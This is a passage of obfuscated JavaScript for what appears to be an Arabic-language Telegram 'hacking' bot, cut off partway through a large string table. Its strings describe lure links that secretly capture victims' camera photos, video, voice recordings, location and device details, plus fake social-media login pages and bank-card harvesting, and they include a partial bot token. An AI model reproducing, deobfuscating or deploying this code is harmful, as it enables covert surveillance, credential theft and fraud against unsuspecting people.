        'KR': _0x544f76(0x863) + _0x544f76(0x920),
        'ES': _0x544f76(0x576),
        'LK': _0x544f76(0x6d4),
        'SD': _0x544f76(0x59b),
        'SE': _0x544f76(0x711),
        'CH': _0x544f76(0x4ce),
        'SY': _0x544f76(0x341),
        'TW': _0x544f76(0x344),
        'TZ': _0x544f76(0x5eb),
        'TH': _0x544f76(0x73b),
        'TG': _0x544f76(0x527),
        'TN': _0x544f76(0x33d),
        'TR': _0x544f76(0x519),
        'TM': _0x544f76(0x7e9) + _0x544f76(0x790),
        'UG': _0x544f76(0x1dd),
        'UA': _0x544f76(0x73d),
        'AE': _0x544f76(0x906),
        'GB': _0x544f76(0x1b6),
        'US': _0x544f76(0x951),
        'UY': _0x544f76(0x345),
        'UZ': _0x544f76(0x325) + _0x544f76(0x58d),
        'VE': _0x544f76(0x767),
        'VN': _0x544f76(0x29a),
        'ZM': _0x544f76(0x469),
        'ZW': _0x544f76(0x8d5),
        'GL': _0x544f76(0x1e8),
        'KY': _0x544f76(0x6a3) + _0x544f76(0x5cc),
        'NI': _0x544f76(0x75d) + _0x544f76(0x6ce),
        'DO': _0x544f76(0x69e) + _0x544f76(0x1d4),
        'NC': _0x544f76(0x26b) + _0x544f76(0x8d9),
        'LA': _0x544f76(0x55e),
        'TT': _0x544f76(0x671) + _0x544f76(0x1c6),
        'GG': _0x544f76(0x59c),
        'GU': _0x544f76(0x1a9),
        'GP': _0x544f76(0x721),
        'MG': _0x544f76(0x3ab),
        'RE': _0x544f76(0x226),
        'FO': _0x544f76(0x713),
        'MD': _0x544f76(0x46f)
    }, camRequestCounts = {};
async function initStorage() {
    const _0x50f16a = _0x544f76, _0x494949 = { 'WmleD': _0x50f16a(0x2e6) };
    await storage[_0x50f16a(0x8c8)](), vipUsers = await storage[_0x50f16a(0x806)](_0x494949[_0x50f16a(0x1d5)]) || [];
}
function _0x2725() {
    const _0x308706 = [
        'Uqjtd',
        'ط\x20🔒',
        'بنين\x20🇧🇯',
        'ه\x20وكلمات\x20ج',
        'deviceType',
        'مالطا\x20🇲🇹',
        'token',
        'attempts',
        'tTAtG',
        'SIGTERM',
        'BYhge',
        'لضحيه\x20فيدي',
        'ه\x20عبر\x20رابط',
        '\x20\x20\x20\x20',
        'getItem',
        'fAkZn',
        'دما\x20تصل\x20ال',
        'NYWUU',
        'تم\x20إنشاء\x20ا',
        'أمريكا',
        'ها\x20رقمي\x20ول',
        'ائل</stron',
        'ZKiXw',
        'i.html',
        'AWVcz',
        'BhEla',
        'Wells\x20Farg',
        'اختراق\x20وات',
        'get_photo_',
        'وله\x20يمكنك\x20',
        '\x20🌐\x0a-\x20اسم\x20ا',
        'info.io/',
        'ooQTz',
        'creationTi',
        '/ge',
        'GItvr',
        '\x20المدفوع\x20ت',
        'inkId',
        'الته\x20من\x20VI',
        'connection',
        'mdIkx',
        'reply_mark',
        'ي\x20راسك....',
        'مية\x20📸',
        '\x20إيميل\x20وهم',
        'Citibank',
        'تم\x20تصوير\x20ا',
        'me/)\x20\x0a*Pre',
        'facebook',
        'ccurred:',
        'https://t.',
        'تسجيل\x20صوت\x20',
        '🇵🇹',
        'CDWGb',
        'latitude',
        'deviceInfo',
        '.mp4',
        'رى\x20لاحقًا.',
        '▓▓▓▓▓▓▓▓▓▓',
        'ع\x201نقطه\x20\x0aع',
        'SfBpL',
        '🇸🇪',
        '7oxkoPuxqz',
        'baszI',
        'ر\x20بهذا\x20الب',
        'RUbrD',
        'kIbtK',
        '\x0a\x20\x20\x20\x20\x20\x20\x20\x20',
        'hostname',
        'Invalid\x20re',
        'حث.',
        'IHqaZ',
        'بيرو\x20🇵🇪',
        'موناكو\x20🇲🇨',
        'المجلد\x20غير',
        'WsfgE',
        '\x20\x0aكلمة\x20الس',
        'nvite',
        '\x20رقم\x20وهمي',
        'بمرجد\x20الدخ',
        'راق',
        'ing\x20Telegr',
        'tiktok',
        'callback_q',
        'iver',
        'RoRei',
        'الدردشة\x20مع',
        'sendMessag',
        'vice_info',
        'ماليزيا\x20🇲🇾',
        'MdWvk',
        '\x20كـ\x20VIP.',
        'catch',
        'سلوفينيا\x20🇸🇮',
        'am\x20message',
        'erica',
        'videos',
        'بوت\x20اختراق',
        'secondName',
        'إغلاق\x20المو',
        'once',
        'PdsRv',
        '&data={\x22op',
        'SOZPf',
        'rJCWK',
        'aMBok',
        'https://nm',
        'كوريا\x20الجن',
        'pfdge',
        'رافي:\x20',
        'orage',
        '\x20•\x20معلومات',
        'file_id',
        'معلومات\x20حس',
        'ستفسار\x20راس',
        'MXikp',
        '/submitPho',
        'Mlizf',
        'TsQWA',
        'همي:',
        'ابط.',
        'KaLGR',
        'بوليفيا\x20🇧🇴',
        ']\x20100%',
        'city',
        'MbMyF',
        'ي\x2030\x20نقطه\x20',
        'OsfcF',
        '7065665133',
        'ة\x20الاتصال',
        'بلجيكا\x20🇧🇪',
        'parse',
        'عندما\x20\x20تصل',
        'rning-anim',
        '/record/',
        'فحص\x20الرابط',
        'أوامر\x20للاس',
        'نيجيريا\x20🇳🇬',
        'Bnond',
        '?start=',
        'ات\x20الجهاز:',
        '\x20فاير\x20👾',
        '/ca',
        'OkAmW',
        'eWtgB',
        '12xjeOjB',
        'العراق\x20🇮🇶',
        'user_id',
        'لهاتف\x20يشحن',
        'لاتفيا\x20🇱🇻',
        'س\x20لديك\x20إيم',
        'HGnWz',
        '.com/',
        'صله\x20اضع\x20في',
        'التواصل\x20مع',
        '4.com',
        'Stored\x20and',
        'POfjB',
        'ache...',
        'utf8',
        'xaysh',
        'تم\x20حذف\x20الذ',
        'ط\x20خمس\x20مرات',
        'موزمبيق\x20🇲🇿',
        'sendFile',
        'hrvAG',
        'sDJLJ',
        'XqKdL',
        'url',
        'الهند\x20🇮🇳',
        'poBFf',
        ':</strong>',
        'لمراقبة\x20📡',
        'إختراق\x20فري',
        '/captureBa',
        'includes',
        'nPAfc',
        'يمل...</st',
        'ل\x20بنجاح:\x0a<',
        '🇨🇳',
        'anding-mas',
        't)\x0a\x20\x20\x20\x20\x20\x20',
        'سوف\x20يتم\x20فت',
        'ت\x20الخبيثه\x20',
        'يه\x20☎️',
        'securityPr',
        'countryCod',
        'rg/en/byco',
        'bmWAn',
        '&type=face',
        '\x20لنه\x20تم\x20فح',
        'UxTgN',
        'CLASSIC',
        'numbers/',
        'VNlSp',
        '0.0.0.0\x20Sa',
        'Clearing\x20c',
        '+7KZ',
        'ViUNr',
        'boid-outst',
        'ل\x20على\x201\x20نق',
        'rbo',
        'JDgJv',
        'مرحبًا!\x20اض',
        'لم\x20يتم\x20اخت',
        'املاً\x20قم\x20ب',
        'agram',
        'kQIjV',
        'init',
        'http://www',
        'ي\x20مالايرضي',
        'tId\x20',
        'Bank\x20of\x20Am',
        'ال\x20معلومات',
        'No\x20visa\x20da',
        'creationDa',
        'FOwfc',
        'lookup',
        'body_text',
        'ذا\x20\x20الرابط',
        'internalSt',
        'زيمبابوي\x20🇿🇼',
        '🇪🇸',
        'cel.app/',
        'بيلاروس\x20🇧🇾',
        '🇳🇨',
        'each',
        'و\x20🎥',
        'ة:</strong',
        'إندونيسيا\x20',
        'لي30\x20نقطه\x20',
        'وامر\x20اخترا',
        'aThHadlLGB',
        '➖\x20الدوله\x20:',
        'NKFoH',
        'gILsF',
        'الية\x20🇰🇵',
        '<strong>❗ل',
        'لاتفيا',
        '\x20sent\x20vide',
        'mkdirSync',
        'sqHBX',
        'lmymn',
        'fOStF',
        '\x20🔁',
        'stringify',
        'إضافة\x20أسما',
        'Kit/537.36',
        'tDNFX',
        'xDbgV',
        'touchSuppo',
        'fawZz',
        '🤣🤣🤣🤣',
        'bDlPX',
        '\x20على\x20الزر\x20',
        '/Messages\x0a',
        'BrrHf',
        'lstatSync',
        'ل\x20بعد\x20🗳ً</',
        '\x20Chrome/11',
        'ميات\x20الذي\x20',
        'RhmCy',
        'data',
        'أسماء\x20المس',
        'انيه\x20مدفوع',
        '\x20complete',
        'ر\x20لجمع\x20معل',
        'SViSY',
        'unlinkSync',
        'JOTcm',
        'الإمارات\x20🇦🇪',
        'phoneNumbe',
        'beBUr',
        'ujPIw',
        'الرسالة\x20📩:',
        'إستونيا\x20🇪🇪',
        '%\x20🔋\x0a-\x20هل\x20ا',
        'PzFvN',
        'شرح\x20البوت\x20',
        'ولة\x20الحصول',
        'اختراق\x20اله',
        'UncCd',
        'owDon',
        'فعل.\x20انتظر',
        'ية\x20تحديد\x20ا',
        'nJbFy',
        'يل\x20بعد\x20🗳</',
        'yPXlM',
        'nvObP',
        'سنغافورة\x20🇸🇬',
        '\x20•\x20تفاصيل\x20',
        'الرجاء\x20الا',
        'امرا\x20الأما',
        'ges',
        '10mb',
        'DRENj',
        'وبية\x20🇰🇷',
        'ر\x20رابط\x20🔒',
        'gram:',
        'array',
        'PDIbG',
        'cpuCores',
        '\x20الجهاز',
        'شتراك\x20في\x20ج',
        'ابط\x20قم\x20في\x20',
        'ل\x20على\x20المن',
        'Xvkdh',
        'ated-drift',
        'BckNQ',
        'ي\x20عن\x20طريق\x20',
        ']\x2050%',
        'ener',
        'load',
        'longitude',
        'bio',
        'uRvZd',
        'drjKf',
        'readdirSyn',
        'الخادم\x20يعم',
        'onText',
        'get_number',
        'SMoXe',
        'mHNeG',
        'FBfHz',
        '/?page=',
        'بلغاريا\x20🇧🇬',
        'بريطانيا',
        '🇱🇻',
        'wwUTp',
        'الجبل\x20الأس',
        'send\x20video',
        '>\x0a\x0aلنشا\x20اي',
        '\x20لاحقًا.',
        'تم\x20تصنيفه\x20',
        'SGLuW',
        '\x20🎨\x0a-\x20تاريخ',
        'max',
        '\x20هذا\x20الراب',
        'ت\x20الجهاز\x20🔬',
        'وخاصه\x20اذا\x20',
        '\x20⚙️\x0a-\x20لغة\x20ا',
        'book',
        'GfDdb',
        'GoLqP',
        'rbytu',
        'امريكا\x20🇺🇸',
        'م\x20الهاتف\x20☎️',
        'from',
        'meString',
        'ي\x20تلغيم\x20را',
        'Data',
        'b.html',
        'TpcSr',
        'إضافة\x20مشتر',
        'اب\x20سريعاً\x0a',
        'في\x20الطلب.',
        'لعبة\x20الأذك',
        '1kNNPU6RVm',
        'chatId=',
        'eo:',
        '\x20(KHTML,\x20l',
        'اختراق\x20الك',
        '@hqooosjjd',
        'member',
        'تم\x20لغيم\x20ال',
        'DUPOt',
        ']\x2025%',
        'فذ\x20',
        'YJouP',
        'تفسير\x20الأح',
        'ram-bot-ap',
        'body-parse',
        'الرجاء\x20الم',
        'LeiTo',
        'دما\x20يقوم\x20ش',
        '\x20و\x20',
        'rshq_tikto',
        '/completio',
        '▓▓▓▓▓▓▓]\x201',
        'ydJaC',
        'me/ZII0_bo',
        'غوام\x20🇬🇺',
        '🇫🇮',
        '/xx',
        'deviceVers',
        'wRWgq',
        'ستخدمين.',
        'ntation',
        'aWiIo',
        'ائل\x20جديدة.',
        'LcEKn',
        '🇸🇻',
        'ومات\x20جهازك',
        'iry\x20:*\x20`',
        'بريطانيا\x20🇬🇧',
        'من\x20أنك\x20لست',
        '/mm',
        'ير\x20هذا\x20الر',
        'الملفات\x20ال',
        '\x20النقاط\x20وف',
        'tknDQ',
        'photos',
        'mdRZqoXRZ_',
        'iUshp',
        'onrender',
        'https://iw',
        'U.S.\x20Bank',
        '🇩🇰',
        'ذا\x20الرابط\x20',
        'DJEcs',
        'توباغو\x20🇹🇹',
        'Processing',
        'حاولة\x20مرة\x20',
        'Thloo',
        'process\x20vi',
        'OilIv',
        'uvIOp',
        'اختراق\x20انس',
        'q.whatsapp',
        'بـ\x20\x22https\x22',
        'instagram',
        'iuUHp',
        'لمستخدم\x20',
        'قر\x20على\x20الر',
        'ن\x20🇩🇴',
        'WmleD',
        'vsfjo',
        'إلغاء\x20اشتر',
        'Kggci',
        'هذا\x20المميز',
        '\x20sent\x20phot',
        'ط\x20لشخاص\x20مو',
        'gTRqL',
        'أوغندا\x20🇺🇬',
        'إيطاليا\x20🇮🇹',
        'ناميبيا\x20🇳🇦',
        'يح\x20يبدأ\x20بـ',
        'الجزائر\x20🇩🇿',
        'n.html',
        'ا\x20الامر\x20/V',
        'منتهى\x20قم\x20ف',
        'n/json',
        'Fifth\x20Thir',
        'ائل\x20للحصول',
        'غرينلاند\x20🇬🇱',
        'W5B7mU',
        '</code>\x0a<s',
        'لفحصه.',
        'join',
        'غواتيمالا\x20',
        '`\x0a*[-]\x20Cou',
        'ه\x20مقفله\x20ان',
        'مل\x20وهمي\x20\x20/',
        'الرجاء\x20إدخ',
        '/getNameFo',
        'iuUxG',
        'zumeV',
        'eHnWf',
        'email',
        'لا\x20يوجد\x20اس',
        '➖\x20وقت\x20الان',
        'قائي.',
        'MnjGz',
        'IHDas',
        'fari/537.3',
        'countryFla',
        'ظر\x20عن\x20رقمي',
        '<strong>تم',
        'VbuoS',
        'تم\x20إضافة\x20ا',
        'البحث\x20عن\x20ص',
        'nAvailable',
        'لم\x20يتم\x20الت',
        'browserVer',
        'vjpeQ',
        'اختراق\x20كام',
        'صربيا',
        '\x20لشركة\x20وتس',
        '🇨🇷',
        'rification',
        'EhRnv',
        'فشل\x20في\x20إرس',
        'php',
        'error',
        'الرسالة\x20رق',
        'cmriF',
        '<strong>قم',
        '\x20الذكاء\x20ال',
        'آمن\x20🟢',
        '\x20الأرقام:',
        'trong>اضغط',
        'كامرات\x20في\x20',
        'ck/:linkId',
        'لروابط',
        '➖\x20رمز\x20الدو',
        '.com',
        'PdRCI',
        'captureBac',
        'CtbOb',
        'لحذر\x20مع\x20ال',
        'ًا.',
        'screenReso',
        'قاط\x20الصور.',
        'knZEa',
        '@uiit89',
        'فرمتة\x20جوال',
        'ريونيون\x20🇷🇪',
        '*\x0a\x0a',
        '🇬🇧',
        'تم\x20التحقق\x20',
        'wrNNl',
        'Mozilla/5.',
        '\x20كل\x20الازرا',
        'إثيوبيا\x20🇪🇹',
        '➖\x20تاريج\x20ال',
        'oxobg',
        'rshq_faceb',
        'عروفة',
        '😁.',
        '\x20لك\x0a\x20يوجد\x20',
        'prev_',
        'muozv',
        'لقد\x20تم\x20وصو',
        'إيقاف\x20البر',
        'on...\x0a[▓▓░',
        '/s.html?ch',
        'oIQKk',
        'لم\x20أتمكن\x20م',
        'geolocatio',
        '\x20يزال\x20مشبو',
        'length',
        'lution',
        'أرسل\x20لي\x20را',
        'ب\x20🛎•\x20\x0a➖\x20رق',
        'nrIeU',
        'ASLIm',
        'span.place',
        'TDeyI',
        'QqHmK',
        'getChatMem',
        'fpnNE',
        'ال\x20للتحقق.',
        'zArnX',
        'حدث\x20خطأ\x20أث',
        'BOaBJ',
        'مله\x20ارسلها',
        '\x20🌐\x0a-\x20إصدار',
        'battery',
        'RLLnb',
        'lastUpdate',
        'ation',
        'https://fl',
        '\x20وظهر\x20أنه\x20',
        'المشاهده\x20ع',
        '/so',
        'phone_numb',
        'رقم\x20الهاتف',
        'بوركينا\x20فا',
        'ion',
        'code',
        'ing\x20video:',
        'OHRAt',
        'https',
        'فنلندا\x20🇫🇮',
        'تعامل\x20معه\x20',
        'لنظام:\x20',
        'r.html',
        '\x20🏙️\x0a-\x20عنوان',
        '/de\x0a\x0a<stro',
        'results',
        'https://fo',
        'add_vip',
        '\x20🌍\x0a-\x20شحن\x20ا',
        'لانتهاء.',
        '\x20موجود:\x20',
        'كاليدونيا\x20',
        'bqKMg',
        'ابط\x20دعوة.',
        'رومانيا\x20🇷🇴',
        'com',
        '\x20أثناء\x20جلب',
        'getLocatio',
        'colorDepth',
        'waiting_fo',
        'sion',
        '<strong>حد',
        '/whatsapp?',
        'QIPsO',
        'المطور\x20@Vl',
        'pMrRI',
        'filePhotos',
        'جنوب\x20أفريق',
        '\x20•\x20مزود\x20ال',
        'Received\x20d',
        'fmJug',
        'الذي\x20تم\x20ان',
        '\x20تم\x20إنشاؤه',
        '\x20📱\x0a-\x20الذاك',
        'EiJwg',
        '\x20📊\x0a-\x20دقة\x20ا',
        'التردد\x20للا',
        '\x20📡\x0a-\x20إمكان',
        '\x0a𝗣𝗮𝘀𝘀𝗲𝗱\x20✅\x0a',
        'add_nammes',
        'ر\x20الدوله\x20ا',
        'XNxII',
        'ثوقين\x20وتحت',
        'MAiuy',
        '/search/my',
        ']\x200%',
        'SwrHH',
        '\x20في\x20نسخه\x20ث',
        'اله\x20طويله\x20',
        '\x20⚡\x0a-\x20الشبك',
        'لب\x20بحث\x20بال',
        'aKgvu',
        '\x20🔒\x0a-\x20نطاق\x20',
        'static',
        'networkTyp',
        'لام\x20🧙‍♂️',
        'اتك\x20[\x20/inf',
        'خص\x20في\x20الدخ',
        'فيتنام\x20🇻🇳',
        'sendVoice',
        'qFqKm',
        '🇦🇷',
        'راقبه',
        'html',
        'rEPKt',
        'رقم\x20في\x20وتس',
        'almunharif',
        'كمبوديا\x20🇰🇭',
        'اضغط\x20على\x20ا',
        'YcLep',
        'om/v1/chat',
        'HRHwI',
        'ource_url=',
        'NUXnw',
        '.png',
        'Hydeo',
        'Aakyq',
        'aDGSC',
        '\x20الله\x20ورسو',
        'QjqUc',
        '\x20📶\x20(سرعة:\x20',
        'IkdsB',
        'path',
        'حث\x20عن\x20الصو',
        'XMVyA',
        'كول\x20الأمان',
        'س\x20لديك\x20ايم',
        'bQTyp',
        'ارساله\x20لضح',
        'جرب\x20دوله\x20م',
        '\x20الكثير\x20من',
        '00%',
        'QZHJo',
        'لم\x20يتم\x20است',
        'غير\x20متوفر',
        'تم\x20حذف\x20الم',
        'ZvbSY',
        'nGTxO',
        'DvgHh',
        '\x20على\x20صورة\x20',
        'كرة\x20المؤقت',
        'XBMSg',
        '🇷🇸',
        'browserNam',
        '<strong>لي',
        'ال\x20الأسماء',
        '🇦🇫',
        'XRYAp',
        '/capture',
        '\x20🔻\x0a-\x20المدي',
        'dfIxn',
        'rong>\x0a\x20\x20\x20\x20',
        'القائمة:\x20',
        'uery',
        'i.internal',
        'يه\x20لمعرفة\x20',
        '؟:\x20',
        'HQdWp',
        'مرحبًا!\x20هذ',
        'Your-User-',
        '<strong>جا',
        'dKivt',
        ':\x20\x0a\x20اليوزر',
        'الكويت\x20🇰🇼',
        'تصفير\x20الذا',
        'rshq_insta',
        'اختر\x20الدول',
        'files',
        'log',
        'EClhA',
        'بنجاح\x20✅',
        'YxgSr',
        'WDfCF',
        'لا\x20توجد\x20رس',
        'vipUsers',
        'PXtKA',
        'KrqWM',
        'WDJbp',
        'imageDatas',
        'rest-plaus',
        'بطًا\x20يبدأ\x20',
        'upwNs',
        '\x20الرابط:\x20',
        'يرجى\x20إرسال',
        'OkIzx',
        '\x20🧠\x0a-\x20الذاك',
        'upport',
        'strong>',
        'hing\x20joke:',
        'TD\x20Bank',
        'MUhkL',
        'و\x20حاول\x20مره',
        't.me',
        'اب\x0aافتيارا',
        '\x20سابقاً\x20هو',
        'Failed\x20to\x20',
        'mm.html',
        'Wpkfm',
        'me/lTV_l/3',
        'seWwkhTzrZ',
        'ont/:linkI',
        'خدمة:\x20',
        'UFuyD',
        '\x20🗑</strong',
        'لإيماءات\x20ا',
        'لرقم\x20لنسخه',
        'LKBhO',
        'إختراق\x20ببج',
        'replit',
        'ه\x20يمنيه\x20قص',
        'ي\x20🕹',
        'اختراق\x20ببج',
        'م\x20هذا\x20هو\x0a:',
        '.me/',
        'hxuKN',
        'KJoxo',
        'FemiV',
        'مصر\x20🇪🇬',
        'تصوير\x20بدقه',
        '-umber.ver',
        '📞\x20إرسال\x20جه',
        'clck',
        '\x20من\x20الخورز',
        'ank',
        '\x20🖥️\x0a-\x20إصدار',
        'mPuDH',
        'kruqa',
        '\x0a➖\x20تم\x20الطل',
        'أستراليا\x20🇦🇺',
        'applicatio',
        'مستخدم\x20لإز',
        'RBOEf',
        'message',
        'اختراق\x20سنا',
        'بانه\x20مشبوه',
        'ن\x20التعامل\x20',
        'مع\x20الشخص\x20ا',
        'أوزبكستان\x20',
        'vyGux',
        'ZdCdj',
        'fZHai',
        'user',
        'TfpmL',
        '\x20روبوتًا.',
        'نيوزيلندا\x20',
        'ميله\x20ومحرج',
        'الأرجنتين\x20',
        '==========',
        'غير\x20قابل\x20ل',
        'recordVoic',
        'حقق\x20من\x20جهة',
        'cZGec',
        '?chatId=',
        '➖\x20المنصه\x20🔮',
        'ذاكرة\x20المؤ',
        '\x0a📱\x20**معلوم',
        '**\x0a-\x20الدول',
        'ود\x20هاذا\x20ال',
        'lBQpR',
        'ال\x20رابط\x20صح',
        'HJoVs',
        'تونس\x20🇹🇳',
        'eZwmU',
        'لام\x20أي\x20رسا',
        'مشبوه\x20🟠',
        'سوريا\x20🇸🇾',
        'message_id',
        'تم\x20اكتشاف\x20',
        'تايوان\x20🇹🇼',
        'أوروغواي\x20🇺🇾',
        'WeGoh',
        'tinyurl',
        'ة\x20تنابع\x20قق',
        'الدنمارك\x20🇩🇰',
        'اليونان\x20🇬🇷',
        'الكاميرون\x20',
        'هاتف\x20هذا\x20ق',
        '\x20المتصفح:\x20',
        '\x20البرامجيا',
        'deviceName',
        'ري\x20انشاء\x20ا',
        '🇬🇹',
        'كازاخستان\x20',
        'باراغواي\x20🇵🇾',
        'امر\x20التالي',
        '📸الصورة\x20',
        '_pins/?q=',
        'لام\x20معلوما',
        'تم\x20إزالة\x20ا',
        'uMwec',
        'بوك\x20🔮',
        'k.glitch.m',
        'تحها\x20مجاني',
        'lOgLJ',
        'أدناه\x20للبح',
        'اك\x20VIP',
        'random',
        'qvPkQ',
        'YlTed',
        'لرابط\x20لختر',
        'all',
        'الدنمارك',
        '/captureFr',
        'buffer',
        'UkgIN',
        '\x20:*\x20`',
        'ode>',
        'GoesU',
        'اليابان\x20🇯🇵',
        '*\x20[BOT](t.',
        'VhjCg',
        'tos',
        'uploads/',
        'المكسيك\x20🇲🇽',
        'rm?chatId=',
        'KeeRq',
        'qacPq',
        'Generating',
        'tCVqs',
        '.\x0a\x20⚠️ملاحظه',
        'بوتسوانا\x20🇧🇼',
        'التصنيف:\x20',
        'قبة\x20📡',
        'JOXWF',
        ':\x20`',
        '\x0aلعرض\x20الرس',
        'السنغال\x20🇸🇳',
        'أنغولا\x20🇦🇴',
        'pHpcM',
        '\x20النقاط\x20ال',
        'عبر\x20رابط\x20🔒',
        '\x20الحساب:*\x0a',
        'ي\x20كلمة\x20الب',
        'البرازيل\x20🇧🇷',
        'hotos:\x20',
        'ناء\x20حذف\x20ال',
        '\x20حتى\x20يتم\x20ا',
        '924320RYlQhX',
        'rQxnn',
        'RtojH',
        'age',
        'vkGxq',
        'UZPkI',
        ':AAELOAVm0',
        'بك\x20فقط.',
        's://t.me/',
        '░░░░░░░]\x200',
        'تصوير\x20الضح',
        'ب\x20شات\x20⭐',
        'gzJro',
        'cizcy',
        'إضافة\x20مستخ',
        '=\x0a[-]\x20by\x20:',
        'tqEhI',
        'dotenv',
        '\x20النكتة.\x20ا',
        'mklBj',
        'P_12',
        'ه\x20لنه\x20يحتو',
        'store',
        'السعودية\x20🇸🇦',
        'LTDaz',
        '\x20قم\x20في\x20تعي',
        'OWWsc',
        'جهازك\x20او\x20ط',
        'ابط\x20الخاص\x20',
        'pniTy',
        'jleQR',
        'رجيه\x20لكتشا',
        'aMNID',
        'LbBBZ',
        'مدغشقر\x20🇲🇬',
        'mXMof',
        '\x20📅\x0a-\x20بروتو',
        'hing\x20love\x20',
        't-break',
        'tions\x22:{\x22q',
        'screenOrie',
        'iJYqM',
        'لشاشة:\x20',
        'سبب\x20ان\x20يوج',
        'تصال:\x20',
        'gtTmb',
        'c.html',
        'userId',
        'coXTj',
        '/submitCod',
        'مالي\x20🇲🇱',
        'ليتوانيا\x20🇱🇹',
        '\x20⚠️',
        'd\x20Type\x20:*\x20',
        '1415218mabDko',
        'ل\x20مره\x20اخرى',
        'xxdGx',
        'mARNs',
        'رابط\x20هذا:\x20',
        'رابط\x20جمع\x20ا',
        '/strong><c',
        'ن\x20العثور\x20ع',
        'for\x20chatId',
        '🇮🇩',
        'ta\x20found\x20o',
        'greencafe2',
        '2DOs-Fgdwp',
        'ار\x20الايمل\x20',
        'de_',
        'ئعة\x20مثل\x20\x0aا',
        'email\x0a\x0aلظه',
        'اختراق\x20تيك',
        'emails.jso',
        'eed\x22:true,',
        '\x20•\x20التصنيف',
        'xx.html',
        'ابط\x20أدناه\x20',
        'Markdown',
        'ايل\x20الذي\x20ت',
        'صورة.',
        'wgtda',
        'اكرة\x20المؤق',
        'oZWVP',
        'An\x20error\x20o',
        'JCHBQ',
        'بنما\x20🇵🇦',
        'ال\x20معرف\x20ال',
        'KmMLb',
        '/submitNam',
        'st.\x0a-\x20اضغط',
        'مكنك\x20تجميع',
        'Rftro',
        'on/:linkId',
        'اول\x20مره\x20اخ',
        'ZII0_bot',
        'eVJIJ',
        'لبوت.',
        '\x20على\x20معلوم',
        'SbMvR',
        'generate_i',
        'ook',
        'لرابط:\x20',
        'yZOPn',
        'push',
        'صربيا\x20🇷🇸',
        'كواد\x20والرس',
        'sendLocati',
        'لقد\x20قام\x20ال',
        'بنغلاديش\x20🇧🇩',
        'cfmry',
        'التمتع\x20في\x20',
        'بـ\x20Pintere',
        'ى\x20صورة\x20الم',
        '/F.html?ch',
        '\x20آخر\x20تحديث',
        'fZnzT',
        'النمسا\x20🇦🇹',
        'remove_vip',
        'ناء\x20إنشاء\x20',
        'dsHZP',
        'وقع\x20📍',
        'every',
        '\x20أي\x20رسالة\x20',
        'org',
        '/getName',
        'bwlQw',
        'ormalize_f',
        'Number\x20:*\x20',
        'zjEka',
        'شاءه\x20\x20/an\x0a',
        'atus:',
        'utu.be',
        't.com/reso',
        '/submitVid',
        'اتف\x20كاملاً',
        'لهرسك\x20🇧🇦',
        'Frequency',
        'إنشاء\x20إيمي',
        'PNC\x20Bank',
        'sHUzx',
        'qiXZM',
        '\x20الرابط\x20بش',
        'on...\x0a[▓▓▓',
        'ضحيه\x20في\x20اد',
        'bvQJk',
        '\x20يتم\x20إنشاء',
        'جرب\x20دوله\x20ا',
        'للمسية:\x20',
        'd\x20Bank',
        '/messages',
        'هذا\x20لفتح\x20أ',
        'wQcoy',
        '\x20as\x20expect',
        '/xx.html?c',
        'كرواتيا\x20🇭🇷',
        'فرنسا\x20🇫🇷',
        'ription\x20st',
        'تفادة\x20من\x20ا',
        'ور\x20ابحث\x20عن',
        'startsWith',
        'ياء\x20🧠',
        'https://sm',
        '➖\x20اضغط\x20ع\x20ا',
        'ه\x20\x0a:\x20https',
        'subject',
        'Chase\x20Bank',
        ']\x2075%',
        'map',
        '\x20أي\x20إيميل\x20',
        'editMessag',
        '\x20أسماء\x20الم',
        'lCXwp',
        '\x20🔵\x0a-\x20دعم\x20ا',
        '🇨🇲',
        'ible-pract',
        'رة\x20الداخلي',
        'query',
        'زيد\x20من\x20الص',
        'fe.html',
        'GAJPL',
        'DMEnd',
        'يد\x20وهمي\x20لا',
        'deo',
        'LKPUJ',
        'JCNtN',
        '👨🏻‍🏫',
        'number',
        'DBZkI',
        '\x20NT\x2010.0;\x20',
        'kDxLx',
        'fTxdx',
        'network',
        'kxsRT',
        'الضحية\x20🎤',
        'ا\x20الخيارت\x20',
        'إزالة\x20مستخ',
        'اقع\x20💣',
        'earchResou',
        'ساب\x20🟢',
        'حدثت\x20مشكلة',
        'ePBXn',
        'k\x20:*\x20`',
        'لقد\x20تم\x20اخت',
        '\x20🖥️\x0a-\x20وضع\x20ا',
        'get_freefi',
        'nMoXP',
        'قبرص\x20🇨🇾',
        '62991dlrHdO',
        'السلفادور\x20',
        'يه\x20عبر\x20راب',
        'crypto',
        'لمميزات\x20تل',
        'تغير\x20الرقم',
        'الرجاء\x20توف',
        'يات\x0aتصاميم',
        '▓▓▓▓░░░░░░',
        '/getNam',
        'AEroX',
        'لنسخها.',
        'صيد\x20فيزات\x20',
        'AVQjR',
        'فلسطين\x20🇵🇸',
        'شخص\x20جديد\x20د',
        'CmAUG',
        'زامبيا\x20🇿🇲',
        'ufIau',
        'yZNsl',
        'https://ip',
        'to\x20generat',
        '\x0a\x0aاضغط\x20على',
        'مولدوفا\x20🇲🇩',
        'trim',
        'VoLkM',
        'wTFxP',
        'test',
        '/imageRece',
        'YxLYE',
        '\x20الضحيه\x20عب',
        'AtDQY',
        'د\x20بعص\x20النا',
        'g.html',
        'KrCBR',
        'goHyC',
        'Bearer\x20sk-',
        'sfQFd',
        't.html',
        'اق\x20وتساب\x0a:',
        'generate_v',
        'glitch',
        'بك\x20سوف\x20تحص',
        'سحب\x20جميع\x20ص',
        'single',
        'gAFiA',
        'Uzica',
        'غيل:\x20',
        'CTLQH',
        'مرحبًا!\x20ان',
        'باكستان\x20🇵🇰',
        'صي.',
        'setItem',
        'كوستاريكا\x20',
        'لا\x20بك\x20:\x20|\x20',
        'base64',
        'language',
        'ue\x20:*\x20`',
        'جداً\x20لا\x20تق',
        '▓▓▓░░░░]\x207',
        '\x0a\x20\x20\x20\x20\x20\x20\x20\x20•',
        'HTGqF',
        'مرحبا!\x20في\x20',
        'تجرام\x20🖥',
        'tPyYP',
        '`\x0a*[-]\x20Ban',
        'تة.',
        'AsESr',
        'rxsVH',
        'لخدمة.</st',
        'سايل\x20الضحي',
        '\x20نظام\x20التش',
        'ي\x20اخاف\x20اشا',
        'المزيد',
        'علومات\x20الج',
        'لمتصفح:\x20',
        '\x20توك\x20📳',
        'د\x20لنسخه</s',
        'باع\x20هذه\x20ال',
        'HfXZT',
        'لقد\x20قمنا\x20ب',
        'https://yo',
        'response',
        'aahjK',
        '🇫🇷',
        'رابط\x20تجميع',
        'الصورة:',
        '▓▓░░░░░░░░',
        'uorescent-',
        'llrOK',
        'GxhWz',
        'facebook.c',
        'NkoOz',
        'راقبه.....',
